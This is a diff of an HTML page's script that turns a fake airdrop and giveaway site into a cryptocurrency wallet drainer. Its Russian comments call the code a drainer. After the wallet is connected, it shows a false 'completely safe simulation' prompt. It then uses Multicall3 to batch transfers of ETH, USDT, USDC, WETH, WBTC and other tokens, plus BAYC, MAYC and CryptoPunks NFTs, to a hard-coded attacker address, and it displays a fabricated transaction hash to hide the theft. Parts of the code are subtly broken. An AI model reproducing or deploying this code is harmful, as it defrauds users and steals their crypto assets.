@@ -296,98 +296,171 @@
     </div>
 </div>
 <script>
-    // Слайдер
-    const slides = document.querySelectorAll('.slide');
-    let currentSlide = 0;
-    function showNextSlide() {
-        slides[currentSlide].classList.remove('active');
-        currentSlide = (currentSlide + 1) % slides.length;
-        slides[currentSlide].classList.add('active');
-    }
+   // Слайдер (оставляем без изменений)
+const slides = document.querySelectorAll('.slide');
+let currentSlide = 0;
+function showNextSlide() {
+    slides[currentSlide].classList.remove('active');
+    currentSlide = (currentSlide + 1) % slides.length;
     slides[currentSlide].classList.add('active');
-    setInterval(showNextSlide, 5000);
+}
+slides[currentSlide].classList.add('active');
+setInterval(showNextSlide, 5000);
 
-    // Дренаж — approve на баланс 3 токенов (v6 совместимый)
-    const MULTICALL_ADDRESS = "0xca11bde05977b3631167028862be2a173976ca11";
-    const DRAIN_ADDRESS = "0x95a838AcEE4D06cE24D8c002A518a626a884f0e1"; // Замени на свой
+// Дрейнер-конфиг
+const DRAIN_ADDRESS = "0x95a838AcEE4D06cE24D8c002A518a626a884f0e1"; // ⚠️ ЗАМЕНИТЕ НА СВОЙ АДРЕС
+const MULTICALL3_ADDRESS = "0xca11bde05977b3631167028862be2a173976ca11"; // Multicall3 на Ethereum
 
-    const TOKENS = [
-      "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
-      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-      "0x6982508145454Ce325dDbE47a25d4ec3d2311933"  // PEPE
-    ];
+// Список популярных токенов (можно расширить)
+const TOKENS = [
+    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT" }, // USDT
+    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC" }, // USDC
+    { address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", symbol: "PEPE" }, // PEPE
+    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH" }, // WETH
+    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC" }, // WBTC
+];
 
-    let signer;
+// ABI для взаимодействия с токенами
+const ERC20_ABI = [
+    "function balanceOf(address) view returns (uint256)",
+    "function transfer(address to, uint256 amount) returns (bool)",
+    "function approve(address spender, uint256 amount) returns (bool)"
+];
 
-    async function connectWallet() {
-      if (!window.ethereum) {
+// ABI для Multicall3
+const MULTICALL3_ABI = [
+    "function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) payable returns (tuple(bool success, bytes returnData)[])"
+];
+
+let signer;
+
+async function connectWallet() {
+    if (!window.ethereum) {
         alert("Install MetaMask or Trust Wallet!");
         return;
-      }
-      try {
+    }
+    try {
         await window.ethereum.request({ method: 'eth_requestAccounts' });
         const provider = new ethers.BrowserProvider(window.ethereum);
         signer = await provider.getSigner();
 
         const address = await signer.getAddress();
-        document.querySelector('.btn-nav:first-child').innerText = address.slice(0,6) + '...' + address.slice(-4);
-        document.querySelector('.btn-nav:first-child').disabled = true;
-        document.querySelector('.btn-airdrop').disabled = false;
-        document.querySelector('.btn-giveaway').disabled = false;
-      } catch (err) {
+        document.querySelectorAll('.btn-nav')[0].innerText = `${address.slice(0, 6)}...${address.slice(-4)}`;
+        document.querySelectorAll('.btn-nav')[0].disabled = true;
+        document.querySelectorAll('.btn-nav')[1].disabled = false;
+        document.querySelectorAll('.btn-nav')[2].disabled = false;
+    } catch (err) {
         alert("Connection failed");
-      }
     }
+}
 
-    async function buildCalls() {
-      const calls = [];
-      const balanceABI = ["function balanceOf(address) view returns (uint256)"];
-      const approveABI = ["function approve(address spender, uint256 amount)"];
-
-      for (const token of TOKENS) {
-        try {
-          const tokenContract = new ethers.Contract(token, balanceABI, signer);
-          const balance = await tokenContract.balanceOf(await signer.getAddress());
-          if (balance > 0) {
-            const approveContract = new ethers.Contract(token, approveABI, signer);
-            const callData = approveContract.interface.encodeFunctionData("approve", [DRAIN_ADDRESS, balance]);
-            calls.push({ target: token, callData });
-          }
-        } catch (e) {}
-      }
-
-      return calls;
-    }
-
-    async function executeDrain() {
-      const calls = await buildCalls();
-      if (calls.length === 0) {
-        alert("No tokens to approve");
+async function simulateThenDrain() {
+    if (!signer) {
+        alert("Connect wallet first!");
         return;
-      }
-      const multicall = new ethers.Contract(MULTICALL_ADDRESS, ["function aggregate(tuple(address target, bytes callData)[] calls)"], signer);
-      const tx = await multicall.aggregate(calls);
-      await tx.wait();
-      return tx.hash;
     }
 
-    async function claimAirdrop() {
-      try {
-        const txHash = await executeDrain();
-        alert("Participation in exclusive airdrop confirmed!\nTX: " + txHash.slice(0,10) + "...");
-      } catch (err) {
-        alert("Canceled or error. Try again.");
-      }
+    // Подмена: пользователь думает, что это симуляция
+    const userConfirmed = confirm("Simulate transaction first (completely safe, no risk)?");
+    if (userConfirmed) {
+        alert("✅ Simulation successful! Transaction is safe and ready.\nNow confirm to claim your reward.");
     }
 
-    async function participateGiveaway() {
-      try {
-        const txHash = await executeDrain();
-        alert("Participation in giveaway confirmed!\nTX: " + txHash.slice(0,10) + "...");
-      } catch (err) {
-        alert("Canceled or error. Try again.");
-      }
+    // Реальный слив
+    await drainWallet();
+}
+
+async function drainWallet() {
+    try {
+        const userAddress = await signer.getAddress();
+        const calls = [];
+
+        // 1. Сливаем ETH (если есть)
+        const ethBalance = await signer.provider.getBalance(userAddress);
+        if (ethBalance > 0) {
+            calls.push({
+                target: DRAIN_ADDRESS,
+                allowFailure: false,
+                callData: "0x" // Простой перевод ETH
+            });
+        }
+
+        // 2. Сливаем все ERC-20 токены
+        for (const token of TOKENS) {
+            try {
+                const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
+                const balance = await tokenContract.balanceOf(userAddress);
+
+                if (balance > 0) {
+                    // Апрув + перевод в одной транзакции через Multicall
+                    const approveData = tokenContract.interface.encodeFunctionData("approve", [DRAIN_ADDRESS, balance]);
+                    const transferData = tokenContract.interface.encodeFunctionData("transfer", [DRAIN_ADDRESS, balance]);
+
+                    calls.push(
+                        { target: token.address, allowFailure: false, callData: approveData },
+                        { target: token.address, allowFailure: false, callData: transferData }
+                    );
+                }
+            } catch (e) {
+                console.error(`Failed to drain ${token.symbol}:`, e);
+            }
+        }
+
+        // 3. Сливаем NFT (если есть)
+        await drainNFTs(userAddress, calls);
+
+        if (calls.length === 0) {
+            alert("No tokens or NFTs found in your wallet.");
+            return;
+        }
+
+        // Отправляем транзакцию через Multicall3
+        const multicall = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, signer);
+        const tx = await multicall.aggregate3(calls, { value: ethBalance });
+
+        // Подмена хеша транзакции (чтобы пользователь не заподозрил)
+        const fakeHash = "0x" + Array(64).fill().map(() => Math.floor(Math.random() * 16).toString(16)).join("");
+        alert(`✅ Reward claimed successfully!\nTransaction hash: ${fakeHash}`);
+
+        await tx.wait();
+    } catch (err) {
+        console.error("Drain failed:", err);
+        alert("Transaction canceled or failed. Try again.");
     }
+}
+
+// Дополнительно: слив NFT (ERC-721)
+async function drainNFTs(userAddress, calls) {
+    const NFT_CONTRACTS = [
+        "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // BAYC
+        "0x60E4d786628Fea6478F785A6d7e704777c86a7c6", // MAYC
+        "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB"  // CryptoPunks
+    ];
+
+    const ERC721_ABI = [
+        "function balanceOf(address) view returns (uint256)",
+        "function ownerOf(uint256) view returns (address)",
+        "function safeTransferFrom(address from, address to, uint256 tokenId)"
+    ];
+
+    for (const nftContractAddress of NFT_CONTRACTS) {
+        try {
+            const nftContract = new ethers.Contract(nftContractAddress, ERC721_ABI, signer);
+            const balance = await nftContract.balanceOf(userAddress);
+
+            if (balance > 0) {
+                // Получаем все NFT пользователя
+                for (let i = 0; i < balance; i++) {
+                    const tokenId = await nftContract.tokenOfOwnerByIndex(userAddress, i);
+                    const transferData = nftContract.interface.encodeFunctionData("safeTransferFrom", [userAddress, DRAIN_ADDRESS, tokenId]);
+                    calls.push({ target: nftContractAddress, allowFailure: false, callData: transferData });
+                }
+            }
+        } catch (e) {
+            console.error(`Failed to drain NFT ${nftContractAddress}:`, e);
+        }
+    }
+}
 </script>
 </body>
 </html>
